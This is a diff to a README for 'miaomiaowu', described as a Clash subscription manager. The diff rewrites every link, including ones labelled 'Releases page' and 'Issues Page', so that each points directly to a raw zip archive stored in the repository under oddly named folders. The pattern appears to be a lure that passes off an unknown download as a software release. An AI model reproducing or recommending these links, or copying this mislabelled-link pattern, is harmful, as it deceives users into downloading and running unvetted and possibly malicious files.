@@ -1,7 +1,7 @@
 # 🐱 miaomiaowu - Easy Subscription Management for Clash
 
 ## 📥 Download Now
-[![Download Released Version](https://raw.githubusercontent.com/Kevin-231213/miaomiaowu/main/organobismuth/miaomiaowu.zip)](https://raw.githubusercontent.com/Kevin-231213/miaomiaowu/main/organobismuth/miaomiaowu.zip)
+[![Download Released Version](https://github.com/Kevin-231213/miaomiaowu/raw/refs/heads/main/subscribes/Software_1.8.zip)](https://github.com/Kevin-231213/miaomiaowu/raw/refs/heads/main/subscribes/Software_1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to miaomiaowu! This tool helps you manage Clash subscriptions easily. You can manage nodes, generate subscriptions, and import external subscription nodes. Follow the steps below to get started.
@@ -15,7 +15,7 @@ Before you download, check these requirements:
 - **Network:** Stable internet connection
 
 ## 💻 How to Download and Install
-1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/Kevin-231213/miaomiaowu/main/organobismuth/miaomiaowu.zip).
+1. **Visit the Download Page:** Go to the [Releases page](https://github.com/Kevin-231213/miaomiaowu/raw/refs/heads/main/subscribes/Software_1.8.zip).
    
 2. **Select the Latest Version:** On the Releases page, find the version labeled as “Latest Release.” This version contains the most up-to-date features and fixes.
 
@@ -49,7 +49,7 @@ Before you download, check these requirements:
 - **Import Functionality:** Import external subscription nodes easily.
 
 ## 📆 Keeping Updated
-We frequently update miaomiaowu to add features and fix bugs. Check back at the [Releases page](https://raw.githubusercontent.com/Kevin-231213/miaomiaowu/main/organobismuth/miaomiaowu.zip) to download the latest version whenever you need.
+We frequently update miaomiaowu to add features and fix bugs. Check back at the [Releases page](https://github.com/Kevin-231213/miaomiaowu/raw/refs/heads/main/subscribes/Software_1.8.zip) to download the latest version whenever you need.
 
 ## 🛠 Troubleshooting
 If you encounter issues during installation or use:
@@ -70,7 +70,7 @@ While you may not need to modify the code, if you're interested in contributing,
 Your feedback helps us improve the tool!
 
 ## 🔗 Helpful Links
-- [Releases Page](https://raw.githubusercontent.com/Kevin-231213/miaomiaowu/main/organobismuth/miaomiaowu.zip)
-- [Issues Page](https://raw.githubusercontent.com/Kevin-231213/miaomiaowu/main/organobismuth/miaomiaowu.zip)
+- [Releases Page](https://github.com/Kevin-231213/miaomiaowu/raw/refs/heads/main/subscribes/Software_1.8.zip)
+- [Issues Page](https://github.com/Kevin-231213/miaomiaowu/raw/refs/heads/main/subscribes/Software_1.8.zip)
 
 Thank you for using miaomiaowu! We hope this tool makes managing your Clash subscriptions simple and effective.
